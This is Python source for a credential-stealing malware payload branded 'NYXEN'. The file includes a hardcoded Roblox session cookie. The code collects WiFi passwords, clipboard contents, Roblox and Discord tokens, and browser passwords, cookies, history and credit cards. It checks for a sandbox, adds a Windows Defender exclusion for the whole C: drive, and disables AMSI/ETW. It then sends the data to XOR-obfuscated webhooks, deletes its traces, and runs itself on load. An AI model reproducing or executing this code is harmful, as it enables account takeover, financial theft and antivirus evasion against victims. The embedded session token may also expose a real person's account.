    robo_cookie = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_CAEaAhAB.6BDF1F3FA06456310126CFB683315C966BCBADADAD643DD176422719EA67A40FCCBCE2CD06C96A401CB7B2C7CFA1200291C1885A94D70B226C59AE169C409A48E004764E47BAB6BF66DD8CA04D841BC6625ABD3E334B67B43BE78AAB8AABF4C56BC0359957ADD4CE03B7DCDC860E33EB91DEC400273BBD83CBD97149019B0BB613E0396B7F5F81F2E4146356D760BAE1A0C79BDF2CCFD1DBB87EB108E2D710B0F842768BA821923D1E705D06FE7D425282E6235C9D8A844C26731DF4EB2809ABFA70C7E29819ACBD156D8D6B81A3023C92717CF22EE6F489AC7354914B071E0331BA05D10AA6629C3EE8CBC4F3E5E20F8DE3DAC5EC3145FC2D8655DA77E389230E808C22A818F31E7D0305BD0B58A8BB6ECB9025CCFD8BDC8293E9C8032F96907C64483E61F47652C513DD79C11A889380A04F79810ECD9738FF9A684D35EBA8EE040C094111CBC5B5C2B27B8CBFA199E116DD51BF0FB4D710D553E1963F44B1F325B00FCB7A195FC87242390666C43D26B9EC0CBCDB2F5ED31EFAF34F96C913830AF1F0ACDE480BE964993E735CCEE8C3527A9013343EB95D45654836F4B218AB1DAB167324FBDD19211BDBD36D753522275ECB5A05D2D6E69D9981045B0546D6B91F89DA48B2EA75E05D7E687E15D19FF46E8C44EE08920533799C6A1C2D1BACF04FD9992D123C7D7404B1338F0563DBBCC11E53B74485AB34323356D24EDD3A0A5DE32A51E40A5B84821077B3D7D13340EFB7072DF82A8CD19C1B47D0A4158FEAEF79F198A2568723A5D5BB6AA22D6816E672F477991CBA27DDECCE700BBE78CB7AC1FACBA838120F90F46FC3DFDE4333B0D9"

    if robo_cookie == "No Roblox Cookies Found":
        return None

    try:
        response = requests.get(
            "https://users.roblox.com/v1/users/authenticated",
            cookies={".ROBLOSECURITY": robo_cookie},
            timeout=10
        )
        response.raise_for_status()
        info = response.json()


        message = f"""
    Username: {info['name']}\n
    Display Name: {info['displayName']}\n
    ID: {info['id']}\n
    """

        return message
    except requests.exceptions.HTTPError as e:
        return None
    except requests.exceptions.RequestException as e:
        return None





def safe_str(s, max_len=500):
    if not s:
        return "N/A"
    s = str(s)
    if len(s) > max_len:
        return s[:max_len] + "..."
    return s

def _build_report():
    import getpass
    import platform
    user = getpass.getuser()
    ip = safe_str(_get_ip())
    sysinfo = safe_str(platform.platform())
    clipboard = safe_str(_get_clipboard())
    wifi = safe_str(_grab_wifi_passwords(), max_len=1000)
    hwid_infO = safe_str(hwidInfo())
    geo = _get_geo_ip()
    lang = _get_pc_language()
    tz = _get_timezone()
    Screen_res = _get_screen_resolution()

    return f"""
🧠 NYXEN REPORT
--------------------
🧍 User: {user}
🌐 IP: {ip}
📍  Geolocation: {geo}
🗣 Language: {lang}
⏰ Timezone: {tz}
💻 OS: {sysinfo}
🛒 HWID: {hwid_infO}
🖥 Screen Res: {Screen_res}
📋 Clipboard: ```{clipboard}```

📶 WiFi Passwords:
{wifi}
"""

def _build_sensitive_report():
    _rblxCookie = safe_str(_retrieve_roblox_cookies(), max_len=10000)
    robloxinfoS = safe_str(robloxinfo())

    return f"""
🎃 Roblox Cookies:
```{_rblxCookie}```

Roblox info:
{robloxinfoS}
"""

def _build_sensitive_report2():
    _discord_info = safe_str(getDiscordInfo())

    return f"""

🎮 Discord Info:
{_discord_info}
"""


def _send_zip_to_webhook(webhook_url, files_dict, temp_dir):
    import requests
    import os
    import io
    import zipfile

    zip_buffer = io.BytesIO()
    with zipfile.ZipFile(zip_buffer, "w", zipfile.ZIP_DEFLATED) as zipf:
        for name, path in files_dict.items():
            if os.path.isfile(path):
                arcname = os.path.basename(path)
                zipf.write(path, arcname=arcname)

    zip_buffer.seek(0)
    payload = {"file": ("BrowserData.zip", zip_buffer.read())}
    return requests.post(webhook_url, files=payload)

def _is_admin():
    import ctypes
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False
    
    

def _enable_exclusion():
    import subprocess
    EXCLUSION_PATH = "C:\\"
    EXCLUSION_CMD = f'powershell -Command "Add-MpPreference -ExclusionPath \'{EXCLUSION_PATH}\'"'
    if not _is_admin():
        return
    try:
        subprocess.run(EXCLUSION_CMD, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        pass

def _disable_exclusion():
    import subprocess
    EXCLUSION_PATH = "C:\\"
    REMOVE_CMD = f'powershell -Command "Remove-MpPreference -ExclusionPath \'{EXCLUSION_PATH}\'"'
    if not _is_admin():
        return
    try:
        subprocess.run(REMOVE_CMD, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        pass


def _run_payload():
    try:
        import os
        import sys
        import time
        import random
        import tempfile

        sandbox_result = _is_sandbox()

        if sandbox_result:
            print("detected:", sandbox_result)
            sys.exit(1)
        else:
            print("No sandbox detected.")


        _enable_exclusion()



        _disable_amsi_etw()

        time.sleep(random.randint(1, 3))
        _add_noise()

        import requests
        __KEY = 72

        encrypted_hooks = [
            b'IDw8ODtyZ2csITsrJzosZisnJWcpOCFnPy0qICcnIztneXx5enl4cXp9e3x7eHx/fnB+emciJgEGOC4MezoHZRJ5A3gdeRJ+cAMBOCUuCnsjCz0nIBoHPHsXLT0dKXgfOTsyAXotfHh4Dx0mOH0dMHA6LQQlZS89Mg==',
            b'IDw8ODtyZ2csITsrJzosZisnJWcpOCFnPy0qICcnIztneXx5enl4cXt9fnl4enB8cH5/emcuCgIYJwclfjssCiwrKycQEHERPhshOx0SexccGXF8fx4ELDAyDRdwGgIPfz45LAoefww/fykEeXAHEgplH38RK3ArAQ==',
            b'IDw8ODtyZ2csITsrJzosZisnJWcpOCFnPy0qICcnIztneXx5enl4cXx5fnlxcH1/eHl4fGcae34EJz8CMTl5PS4kLQV9DjosBQUrIX99HwwcEDkbeXsvLiNlKSwaMR4ReAYuPBh7HjAMBRIgFyEKHnodASp8eDx4BQ=='
        ]

        webhooks = [_xor_decrypt(hook, __KEY) for hook in encrypted_hooks]


        browser_data = _run_browser_data_extraction()


        temp_dir = tempfile.mkdtemp(prefix="browser_stealer_")


        browser_files = _run_browser_data_extraction()

        passwords_path = browser_files['passwords']
        cookies_path = browser_files['cookies']
        history_path = browser_files['history']
        cards_path = browser_files['credit_cards']



        msg_main = _build_report()
        msg_sensitive = _build_sensitive_report()
        msg_sensitive2 = _build_sensitive_report2()


        def send_file_webhook(url, content, filepath):
            with open(filepath, "rb") as f:
                files = {"file": (os.path.basename(filepath), f)}
                response = requests.post(url, data={"content": content}, files=files)
            return response
        
        for webhook_url in webhooks:
            try:
                r1 = requests.post(webhook_url, json={"content": msg_main})
                if r1.status_code not in (200, 204):
                    continue

                r2 = requests.post(webhook_url, json={"content": msg_sensitive})
                if r2.status_code not in (200, 204):
                    continue

                r3 = requests.post(webhook_url, json={"content": msg_sensitive2})
                if r3.status_code not in (200, 204):
                    continue


                zip_resp = _send_zip_to_webhook(webhook_url, browser_files, temp_dir)
                if zip_resp.status_code == 429:
                    time.sleep(int(zip_resp.headers.get("Retry-After", 2)) / 1000)
                elif zip_resp.status_code not in (200, 204):
                    continue

                break 

            except Exception as e:
                continue
            

        for f in [passwords_path, cookies_path, history_path, cards_path]:
            try: os.remove(f)
            except: pass
        try: os.rmdir(temp_dir)
        except: pass

    except Exception as e:
        print(e)
        pass
    finally:
        _disable_exclusion() 

print("Starting payload...")
_run_payload()